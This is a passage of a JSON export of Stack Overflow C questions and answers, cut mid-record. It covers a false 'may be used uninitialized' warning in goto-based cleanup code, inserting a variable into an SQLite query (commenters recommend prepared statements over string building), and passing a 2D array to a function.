(goto-less) programming. However, the code is still not <i>purely structured</i>."}, {"owner": {"reputation": 304, "user_id": 9307322, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e780c3bd3c1580381fe8b3abb66d2a7c?s=128&d=identicon&r=PG&f=1", "display_name": "abjoshi - Reinstate Monica", "link": "https://stackoverflow.com/users/9307322/abjoshi-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524652486, "post_id": 50018852, "comment_id": 87055918, "body": "Though this is not functionally equivalent, I concede I could have done better."}], "tags": [], "owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "is_accepted": true, "score": 3, "last_activity_date": 1524652084, "last_edit_date": 1524652084, "creation_date": 1524649050, "answer_id": 50018852, "question_id": 50017462, "link": "https://stackoverflow.com/questions/50017462/bogus-may-be-used-uninitialized/50018852#50018852", "title": "Bogus &#39;may be used uninitialized", "body": "<p>Compiler try it's best to produce warning, as the message say \"maybe\", the compiler don't know that <code>ENC_ZIP_ENABLED(comp_enc_flags)</code> will be false at the label <code>out_enc_zip</code>. Your code don't use an uninitialized value.</p>\n\n<p>That say, I strongly disagree about your use case of <code>goto</code>, your code is unreadable, I take a lot of time just to understand where the code was going.</p>\n\n<p>Your code could be simplified a lot, I'm not sure at 100% that this code have the same behavior as I said your code is hard to read:</p>\n\n<pre><code>#define ENC  (1UL &lt;&lt; 1)\n#define ZIP  (1UL &lt;&lt; 2)\n\nint handle_comp_enc(unsigned long comp_enc_flags, unsigned char *read_data,\n                    size_t read_len, unsigned char *write_data, size_t *write_len2) {\n        if ((comp_enc_flags &amp; (ENC | ZIP)) == (ENC | ZIP)) {\n            unsigned char *tmp = kmalloc(get_compress_fsize(PAGE_SIZE), GFP_KERNEL);\n            if (!tmp) {\n                    return -ENOMEM;\n            }\n            size_t size;\n            int err = do_compress(read_data, read_len, tmp, &amp;size);\n            if (!(err &lt; 0)) {\n                err = do_skcipher_encrypt(tmp, size, write_data, write_len2);\n            }\n            kfree(tmp);\n            return err;\n        }\n        else if (!(comp_enc_flags &amp; ENC)) {\n              return do_compress(read_data, read_len, write_data, write_len2);\n        }\n        else {\n            return do_skcipher_encrypt(read_data, read_len, write_data, write_len2);\n        }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 304, "user_id": 9307322, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e780c3bd3c1580381fe8b3abb66d2a7c?s=128&d=identicon&r=PG&f=1", "display_name": "abjoshi - Reinstate Monica", "link": "https://stackoverflow.com/users/9307322/abjoshi-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524652757, "post_id": 50019395, "comment_id": 87056070, "body": "Though this is not functionally equivalent, I concede I could have done better in <i>this</i> case. Like I said in response to Stargaetur, had the error handling been more complex, this would have been a harder problem.  Regarding your point about getting rid of branching instructions: that may be true. But consider the scenario, where you have to call your outer cleanup functions(as you mentioned above) many times. If they are small(and they usually are), compiler may inline them and they may end up being part of your code. Second, this would also increase your instruction cache footprint."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 304, "user_id": 9307322, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e780c3bd3c1580381fe8b3abb66d2a7c?s=128&d=identicon&r=PG&f=1", "display_name": "abjoshi - Reinstate Monica", "link": "https://stackoverflow.com/users/9307322/abjoshi-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524653296, "post_id": 50019395, "comment_id": 87056355, "body": "@abjoshi Readability is the most important here though, not some mini-optimizations. Had the error handling been more complex, this would scale much better. An internal function can then just <code>return</code> upon error, instead of creating something complex with nested statements or multiple goto labels."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 1, "last_activity_date": 1524650543, "creation_date": 1524650543, "answer_id": 50019395, "question_id": 50017462, "link": "https://stackoverflow.com/questions/50017462/bogus-may-be-used-uninitialized/50019395#50019395", "title": "Bogus &#39;may be used uninitialized", "body": "<p>Yeah it looks like a false positive. In your if-else if-else, you only initialize the variable inside the <code>if</code> and <code>else if</code> statements. Apparently you got the tool confused with goto or some such.</p>\n\n<p>But that's not really important, as the origin of the problems is the function design. You don't default initialize variables and you have a tight coupling between memory allocation and the actual algorithm. The use of goto here is ok but it reduces readability somewhat.</p>\n\n<p>I would split this in two functions, where you leave memory handling and error handling to an outer function. Something along the lines of this pseudo code would be much more readable:</p>\n\n<pre><code>int wrapper_function ( ... )\n{\n  unsigned char *write_cdata = NULL;\n  int err = initialize_me_to_something.\n\n  if(ENC_ZIP_ENABLED(comp_enc_flags))\n  {\n    write_cdata = kmalloc (...\n    if(write_cdata == NULL)\n    {\n      return -ENOMEM;\n    }\n  }\n  else\n  {\n    if(!(comp_enc_flags &amp; ENC)\n    {\n      write_cdata = write_data;\n      ...\n    }\n    else\n    { // some special case\n      err = do_skcipher_encrypt(...\n      return err;\n    }\n  }\n\n\n  err = do_the_actual_job(write_cdata, otherparameters); \n\n  if (err &lt; 0) \n  {\n    cleanup();\n  }\n\n  return err;\n}\n</code></pre>\n\n<p><code>goto</code> is not necessarily evil, but neither are multiple return statements. They are both frowned upon with more or less rational arguments provided. However, multiple return statements tend to improve readability quite a bit over the \"on error goto\" pattern. Most importantly, they tend to naturally give a better program design with multiple small functions instead of a single big one.</p>\n\n<p>As a side effect, you get rid of some extra branching instructions, which might give a slight performance improvement. </p>\n"}], "owner": {"reputation": 304, "user_id": 9307322, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e780c3bd3c1580381fe8b3abb66d2a7c?s=128&d=identicon&r=PG&f=1", "display_name": "abjoshi - Reinstate Monica", "link": "https://stackoverflow.com/users/9307322/abjoshi-reinstate-monica"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 412, "favorite_count": 0, "accepted_answer_id": 50018852, "answer_count": 2, "score": 1, "last_activity_date": 1524652084, "creation_date": 1524644921, "last_edit_date": 1524647181, "question_id": 50017462, "link": "https://stackoverflow.com/questions/50017462/bogus-may-be-used-uninitialized", "title": "Bogus &#39;may be used uninitialized", "body": "<p>I am getting an unitialized warning in the following code, and I am stumped trying to figure out why. \nI can't see a code path where it is used uninitialized.Can anyone please help?\nAlso, I could use some adivce on if my gotos are not used well or if there is a cleaner way of doing this.</p>\n\n<p></p>\n\n<pre><code> In function \u2018handle_comp_enc\u2019:\nfs/compress.c:101:8: warning: \u2018write_cdata\u2019 may be used uninitialized in this function [-Wmaybe-uninitialized]\n   kfree(write_cdata);\n</code></pre>\n\n<p>Code:</p>\n\n<pre><code>#define ENC  (1UL &lt;&lt; 1)\n#define ZIP  (1UL &lt;&lt; 2)\n#define ENC_ZIP_ENABLED(cmp_enc_flags) ((cmp_enc_flags) &amp; (ENC | ZIP)) == (ENC | ZIP)\n\n\nint handle_comp_enc(unsigned long comp_enc_flags, unsigned char *read_data,\n                        size_t read_len, unsigned char *write_data, size_t *write_len2) {\n        unsigned char *write_cdata, *rd_enc_data;\n        size_t write_clen, enc_src_len;\n        int err;\n        if (ENC_ZIP_ENABLED(comp_enc_flags)){\n                write_cdata = kmalloc(get_compress_fsize(PAGE_SIZE), GFP_KERNEL);\n                if (!write_cdata) {\n                        err  = -ENOMEM;\n                        goto zip_only;\n                }\n        }\n        else if(!(comp_enc_flags &amp; ENC))\n                write_cdata = write_data;\n        else{\n                rd_enc_data = read_data;\n                enc_src_len = read_len;\n                goto enc_only;\n        }\n        err = do_compress(read_data, read_len, write_cdata, &amp;write_clen);\n        if (err &lt; 0) {\n                goto out_enc_zip;\n        }\n        if (!(comp_enc_flags &amp; ENC)) {\n                *write_len2 = write_clen;\n                goto zip_only;\n        }\n        rd_enc_data = write_cdata;\n        enc_src_len = write_clen;\nenc_only:\n        err = do_skcipher_encrypt(rd_enc_data, enc_src_len, write_data, write_len2);\n        if (err &lt; 0) {\n        }\nout_enc_zip:\n        if (ENC_ZIP_ENABLED(comp_enc_flags))\n                kfree(write_cdata);\nzip_only:\n        return err;\n}\n</code></pre>\n"}, {"tags": ["c", "string", "variables", "sqlite"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1524642818, "post_id": 50016807, "comment_id": 87049825, "body": "<code>snprintf</code>? Or use the database-specific API variable binding (which just about <i>all</i> database API&#39;s have)?"}, {"owner": {"reputation": 2048, "user_id": 4961259, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9b82c25cbde4d52888e6eccc44764b80?s=128&d=identicon&r=PG&f=1", "display_name": "Kami Kaze", "link": "https://stackoverflow.com/users/4961259/kami-kaze"}, "edited": false, "score": 0, "creation_date": 1524642843, "post_id": 50016807, "comment_id": 87049844, "body": "maybe you want to check <code>printf</code>and its bretheren."}, {"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 4, "creation_date": 1524644137, "post_id": 50016807, "comment_id": 87050648, "body": "Take a look at <a href=\"https://www.sqlite.org/c3ref/stmt.html\" rel=\"nofollow noreferrer\">SQLite prepared statements</a>. Prepare a statement then bind the parameters. Building your own sql in runtime is a bad idea that can lead to SQL injection vulnerabilities."}, {"owner": {"reputation": 4011, "user_id": 1788851, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JBd9d.gif?s=128&g=1", "display_name": "Edouard Thiel", "link": "https://stackoverflow.com/users/1788851/edouard-thiel"}, "edited": false, "score": 0, "creation_date": 1524644465, "post_id": 50016807, "comment_id": 87050819, "body": "Possible duplicate from <a href=\"https://stackoverflow.com/questions/7629501/how-to-sanitize-sql-queries-in-c?lq=1\">this question</a>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1524644612, "post_id": 50016807, "comment_id": 87050906, "body": "Not exactly (it&#39;s about mysql). Couldn&#39;t someone who used sqlite before write a <i>good</i> answer here please? ;)"}, {"owner": {"reputation": 2095, "user_id": 7038689, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ea19ae9f57b95d7abfeaa796650bd2d1?s=128&d=identicon&r=PG&f=1", "display_name": "Matt P", "link": "https://stackoverflow.com/users/7038689/matt-p"}, "edited": false, "score": 0, "creation_date": 1524687178, "post_id": 50016807, "comment_id": 87077220, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/45840798/c-how-to-use-variables-as-part-of-an-sql-query\">C - How to use variables as part of an SQL Query?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 4011, "user_id": 1788851, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JBd9d.gif?s=128&g=1", "display_name": "Edouard Thiel", "link": "https://stackoverflow.com/users/1788851/edouard-thiel"}, "edited": false, "score": 1, "creation_date": 1524643944, "post_id": 50017125, "comment_id": 87050523, "body": "Generally speaking avoid <code>sprintf</code>, prefer <code>snprintf</code> to avoid buffer overflow."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1524643990, "post_id": 50017125, "comment_id": 87050552, "body": "I don&#39;t know the sqlite API, but I strongly assume it has parametrized / prepared statements. In this case, your answer is really bad advice."}, {"owner": {"reputation": 787, "user_id": 6715227, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NB84a.png?s=128&g=1", "display_name": "stetoc", "link": "https://stackoverflow.com/users/6715227/stetoc"}, "edited": false, "score": 0, "creation_date": 1524644066, "post_id": 50017125, "comment_id": 87050609, "body": "@FelixPalmen it&#39;s exactly what OP asked for - he didn&#39;t ask for parametrized queries, also by example given by him I can assume he wanted way to insert value of variable on given position in string"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1524644106, "post_id": 50017125, "comment_id": 87050630, "body": "just googled it: <a href=\"https://www.sqlite.org/c3ref/bind_blob.html\" rel=\"nofollow noreferrer\">sqlite.org/c3ref/bind_blob.html</a> --- <b>never</b> use your own &quot;sql string building&quot; if you have a decent API for binding parameters. SQL injections are just around the corner!"}, {"owner": {"reputation": 787, "user_id": 6715227, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NB84a.png?s=128&g=1", "display_name": "stetoc", "link": "https://stackoverflow.com/users/6715227/stetoc"}, "edited": false, "score": 0, "creation_date": 1524644175, "post_id": 50017125, "comment_id": 87050662, "body": "@FelixPalmen that&#39;s true, but look at OPs example, he clearly wants sprintf-like function  <code>I want something like this in Java:  String string = String.format(&quot;A string %s&quot;, aVariable);</code>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1524644257, "post_id": 50017125, "comment_id": 87050703, "body": "A good answer should give good advice. This is bad advice, IMHO. OPs java code of course is just as bad."}], "tags": [], "owner": {"reputation": 787, "user_id": 6715227, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NB84a.png?s=128&g=1", "display_name": "stetoc", "link": "https://stackoverflow.com/users/6715227/stetoc"}, "is_accepted": false, "score": -1, "last_activity_date": 1524644006, "last_edit_date": 1524644006, "creation_date": 1524643761, "answer_id": 50017125, "question_id": 50016807, "link": "https://stackoverflow.com/questions/50016807/how-can-i-set-a-variable-placeholder-inside-a-string-in-c/50017125#50017125", "title": "How can I set a variable placeholder inside a String in C", "body": "<p>use <code>snprintf</code>, pseudocode looks like this:</p>\n\n<pre><code>int idValue = 1234;\nsnprintf(buffer, bufferLength, \"insert bla bla VALUES (%d, 'John Doe', 25, 'Rich-Mond ', 65000.00 )\", idValue);\nsqli_execute(buffer);\n</code></pre>\n\n<p>in your case it will look like:</p>\n\n<pre><code>//initialize sql variable before sprintfing into it\nsnprintf(sql, maximumSqlBufferLength \"INSERT INTO REV_ENTITY (ID, NAME, AGE, ADDRESS, SALARY) VALUES (%d, 'John Doe', 25, 'Rich-Mond ', 65000.00 );\", id);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 827, "user_id": 7383242, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c65444c41048c45464ae10a9cafa0c41?s=128&d=identicon&r=PG&f=1", "display_name": "medalib", "link": "https://stackoverflow.com/users/7383242/medalib"}, "is_accepted": true, "score": 1, "last_activity_date": 1524678204, "last_edit_date": 1524678204, "creation_date": 1524655753, "answer_id": 50021163, "question_id": 50016807, "link": "https://stackoverflow.com/questions/50016807/how-can-i-set-a-variable-placeholder-inside-a-string-in-c/50021163#50021163", "title": "How can I set a variable placeholder inside a String in C", "body": "<p>Besides <code>snprintf</code> mentioned in the other answer, you can use the <code>char *sqlite3_mprintf(const char*,...)</code> function from the sqlite3 API. It uses the sqlite <code>printf</code> built-in function and it allocates memory for the string using <code>sqlite3_malloc64()</code>. If everything goes well, it returns a pointer to the string , otherwise it returns <code>NULL</code>:</p>\n\n<pre><code>int id = 999;\nchar *sql;\nsql = sqlite3_mprintf(\"INSERT INTO REV_ENTITY (ID,NAME,AGE,ADDRESS,SALARY) VALUES (%d, 'REV', 25, 'Rich-Mond ', 65000.00 )\", id);\nif (sql != NULL) {\n    rc = sqlite3_exec(db, sql, callback, 0, &amp;zErrMsg);\n    if (rc != SQLITE3_OK)\n        /* Do some error handling. */\n    sqlite3_free(sql);\n}\n</code></pre>\n\n<p>Unlike <code>printf</code> functions family, <code>sqlite3_mprintf</code> does not have the luxury to report if the format is not correlated with the arguments. So, if it happens that you use GCC compiler, adding the following code can be useful:</p>\n\n<pre><code>extern char *sqlite3_mprintf(const char *format, ...) __attribute__ ((format (printf, 1, 2)));\n</code></pre>\n\n<p>The other solution recommended in comments, is to use the sqlite3 prepare, step and finalize functions:</p>\n\n<pre><code>int id = 999;\nsqlite3_stmt *stmt = NULL;\nchar *sql = \"INSERT INTO REV_ENTITY (ID,NAME,AGE,ADDRESS,SALARY) \" \\\n            \" VALUES (?, 'REV', 25, 'Rich-Mond ', 65000.00 )\";\nsqlite3_prepare(db, sql, strlen(sql), &amp;stmt, NULL);\n/* Bind id. */\nsqlite3_bind_int(stmt, 1, id);\nif (sqlite3_step(stmt) == SQLITE_DONE) {\n    printf(\"Insertion success\\n\");\n} else {\n    fprintf(stderr, \"Insertion error\\n\");\n}\n/* Finalize and destroy statement. */\nsqlite3_finalize(stmt);\n</code></pre>\n"}], "owner": {"reputation": 5278, "user_id": 3663765, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/03caa8002f94a2ffd40630239d7a35c6?s=128&d=identicon&r=PG&f=1", "display_name": "Program-Me-Rev", "link": "https://stackoverflow.com/users/3663765/program-me-rev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 545, "favorite_count": 0, "accepted_answer_id": 50021163, "answer_count": 2, "score": 0, "last_activity_date": 1524678204, "creation_date": 1524642698, "last_edit_date": 1524644062, "question_id": 50016807, "link": "https://stackoverflow.com/questions/50016807/how-can-i-set-a-variable-placeholder-inside-a-string-in-c", "title": "How can I set a variable placeholder inside a String in C", "body": "<p>How can I set a variable placeholder inside a String in C?  </p>\n\n<p>For example, set <strong><code>ID</code></strong> from a variable <code>int id = 1234</code>.  </p>\n\n<pre><code>sql = \"INSERT INTO REV_ENTITY (ID, NAME, AGE, ADDRESS, SALARY)\" \\\n          \"VALUES (99, 'John Doe', 25, 'Rich-Mond ', 65000.00 );\";\n</code></pre>\n\n<p><strong>UPDATE</strong>  </p>\n\n<p>I would like to have a final String that has the variable value in it.  </p>\n\n<p>This, as suggested doesn't work:  </p>\n\n<pre><code>sql = \"INSERT INTO REV_ENTITY (ID,NAME,AGE,ADDRESS,SALARY)\" \\  \n    \"VALUES (%d, 'REV', 25, 'Rich-Mond ', 65000.00 );\";  \n\nrc = sqlite3_exec(db, printf(sql, 999), callback, 0, &amp;zErrMsg);  \n</code></pre>\n\n<p>I want something like this in Java:  </p>\n\n<pre><code>String string = String.format(\"A string %s\", aVariable);\n</code></pre>\n"}, {"tags": ["c", "arrays", "function", "multidimensional-array", "call"], "comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1524642974, "post_id": 50016805, "comment_id": 87049943, "body": "&quot;Our professor&quot;, tell him/her for me that <code>array</code> in <code>void ShowMatrix(int array[][], int W1, int W2);</code> IS NOT AN ARRAY. Thanks. prototype is wrong and should be <code>void ShowMatrix(int (*not_an_array)[10], int W1, int W2);</code>, vote to close as simple typo"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1524645017, "post_id": 50016805, "comment_id": 87051144, "body": "The calling code is wrong too. It&#39;s not clear if the error comes from the student or teacher. What is clear however, is that this is C90 and that the knowledge of C programming teachers around the world remains very poor."}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1524646555, "post_id": 50016805, "comment_id": 87052098, "body": "Also, your 2nd question is (A) one question too many and should be posted separately and (B) hopelessly vague; if you want help with an error, quote it; don&#39;t just vaguely gesture at it."}], "answers": [{"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 1, "last_activity_date": 1524644825, "creation_date": 1524644825, "answer_id": 50017438, "question_id": 50016805, "link": "https://stackoverflow.com/questions/50016805/c-call-function-give-2d-array/50017438#50017438", "title": "C - Call Function &amp; give 2D Array", "body": "<p>The prototype containing <code>int array[][]</code> is an incomplete type. This will not compile. If you for some reason must have an incomplete type in the header (I have no idea why you would want this), then you'd have to declare the array as <code>array[][*]</code>. That will make the code compile, but it is nonsensical still.</p>\n\n<p>The proper way to declare the function would otherwise be this:</p>\n\n<pre><code>void ShowMatrix(int W1, int W2, int array[W1][W2]);\n</code></pre>\n\n<p>You can then call the function as</p>\n\n<pre><code>ShowMatrix(W1, W2, array);\n</code></pre>\n\n<p>But this requires that you use a standard C compiler. Judging by your coding style, it seems that you are getting taught to use a 30 years old and obsolete version of C, so this might not work for you.</p>\n\n<p>You should ask your teacher why they teach you programming knowledge from 1989 instead of 2018.</p>\n"}, {"comments": [{"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1524646152, "post_id": 50017772, "comment_id": 87051816, "body": "and <i>why</i> is that the problem?"}], "tags": [], "owner": {"reputation": 3624, "user_id": 8013471, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jh4jO.jpg?s=128&g=1", "display_name": "cse", "link": "https://stackoverflow.com/users/8013471/cse"}, "is_accepted": true, "score": -1, "last_activity_date": 1524646940, "last_edit_date": 1524646940, "creation_date": 1524645835, "answer_id": 50017772, "question_id": 50016805, "link": "https://stackoverflow.com/questions/50016805/c-call-function-give-2d-array/50017772#50017772", "title": "C - Call Function &amp; give 2D Array", "body": "<p>The problem is in following lines:</p>\n\n<ul>\n<li><code>ShowMatrix(array[][W2], W1, W2);</code> in <code>main</code> function. Change it to <code>ShowMatrix(array, W1, W2);</code> <em><strong>Reason</strong></em> Parameter is mismatched. In function definition you stated that <em>first parameter is a 2D array</em> but you are not passing a 2D array.</li>\n<li><code>void ShowMatrix(int array[][10], int W1, int W2)</code> in function defintion. Change it to <code>void ShowMatrix(int array[][W2], int lenD1, int lenD2)</code>.  <em><strong>Reason</strong></em> <code>W1</code> and <code>W2</code> are <em>compile time constants</em>. They can not hold value passed to function. These should be some variable names. In <code>int array[][W2]</code>, <code>W2</code> is used just to as <em>good programming practice</em></li>\n<li>You need to change the function deceleration accordingly i.e. change <code>void ShowMatrix(int array[][], int W1, int W2);</code> to <code>void ShowMatrix(int array[][W2], int lenD1, int lenD2)</code> in <em>ShowMatrix.h</em> file. <em><strong>Reason</strong></em> Function <em>deceleration</em> should match function <em>definition</em> and vice versa.</li>\n</ul>\n\n<p>You can see the complete working code <a href=\"https://ideone.com/fgnFkx\" rel=\"nofollow noreferrer\">here</a>.</p>\n\n<p>Following is corrected code.(line <code>#include \"ShowMatrix.h\"</code> is commented becuase hosting environment don't support code spread across multiple files):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n//#include \"ShowMatrix.h\"\n\n#define W1 10\n#define W2 10\n\nvoid ShowMatrix(int array[][W2], int lenD1, int lenD2)\n{\n    int a,b;\n    for(a = 0; a &lt; lenD1; ++a)\n    {\n        for(b=0; b&lt;lenD2; ++b)\n        {\n            printf(\"Inhalt von Array[%d][%d] \",a,b);\n            printf(\"ist: %d \\n\", array[a][b]);\n        }\n    }\n}\n\nint main(void) {\n    int a,b;\n    int array[W1][W2];\n    for(a = 0; a &lt; W1; ++a)\n    {\n        for(b=0; b&lt;W2; ++b)\n        {\n            array[a][b] = rand() %10;\n        }\n    }\n    ShowMatrix(array, W1, W2);\n\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>Inhalt von Array[0][0] ist: 3 \nInhalt von Array[0][1] ist: 6 \nInhalt von Array[0][2] ist: 7\n...\n</code></pre>\n"}], "owner": {"reputation": 9, "user_id": 7012491, "user_type": "registered", "profile_image": "https://graph.facebook.com/1530380513642484/picture?type=large", "display_name": "Gerrit Welsch", "link": "https://stackoverflow.com/users/7012491/gerrit-welsch"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "closed_date": 1524647690, "accepted_answer_id": 50017772, "answer_count": 2, "score": -2, "last_activity_date": 1524646940, "creation_date": 1524642697, "question_id": 50016805, "link": "https://stackoverflow.com/questions/50016805/c-call-function-give-2d-array", "closed_reason": "Duplicate", "title": "C - Call Function &amp; give 2D Array", "body": "<p>Our professor at school gave us a \"simple\" programm task in C.</p>\n\n<p>We should create a 2D Array, fill it with random numbers and give it to another function. This function should give out the 2D-Array. </p>\n\n<p>The problem is: How do i hand over the 2D Array? </p>\n\n<p>Also i have a problem by calling the function. I Included the .h file, but it always give errors.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"ShowMatrix.h\"\n\n#define W1 10\n#define W2 10\nint main(void) {\n    int a,b;\n    int array[W1][W2];\n    for(a = 0; a &lt; W1; ++a)\n    {\n        for(b=0; b&lt;W2; ++b)\n        {\n            array[a][b] = rand() %10;\n        }\n    }\n    ShowMatrix(array[][W2], W1, W2);\n\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>The function which i want to call:</p>\n\n<pre><code>void ShowMatrix(int array[][10], int W1, int W2)\n{\n    int a,b;\n    for(a = 0; a &lt; W1; ++a)\n    {\n        for(b=0; b&lt;W2; ++b)\n        {\n            printf(\"Inhalt von Array[%d][%d] \",a,b);\n            printf(\"ist: %d \\n\", array[a][b]);\n        }\n    }\n}\n</code></pre>\n\n<p>Header part of the func:</p>\n\n<pre><code>#ifndef SHOWMATRIX_H_\n#define SHOWMATRIX_H_\n\nvoid ShowMatrix(int array[][], int W1, int W2);\n\n#endif /* SHOWMATRIX_H_ */\n</code></pre>\n"}, {"tags": ["c", "performance", "if-statement", "time"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1524641732, "post_id": 50016445, "comment_id": 87049163, "body": "What have you got against arr[0]?"}, {"owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "edited": false, "score": 1, "creation_date": 1524641825, "post_id": 50016445, "comment_id": 87049229, "body": "With modern compiler optimizations, your inefficient <code>if</code> structure could very well be getting rewritten"}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1524641896, "post_id": 50016445, "comment_id": 87049274, "body": "Simplify the program right down, and check the generated assembly. That might surprise you. Also the statistical rigour of your test is lacking."}, {"owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "edited": false, "score": 0, "creation_date": 1524642033, "post_id": 50016445, "comment_id": 87049346, "body": "Low level optimization only make sense for a precise version of a precise compiler with precise flags. Different compilers of optimization level could lead to different results. If you are using gcc or clang, you could try to check the generated assembly."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1524642236, "post_id": 50016445, "comment_id": 87049476, "body": "Hard to say without knowing all details of your system. But I would consider whether branch prediction plays a role here."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 1, "creation_date": 1524642347, "post_id": 50016445, "comment_id": 87049543, "body": "Link: <a href=\"https://stackoverflow.com/a/11227902/4386427\">stackoverflow.com/a/11227902/4386427</a>"}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 9695520, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", 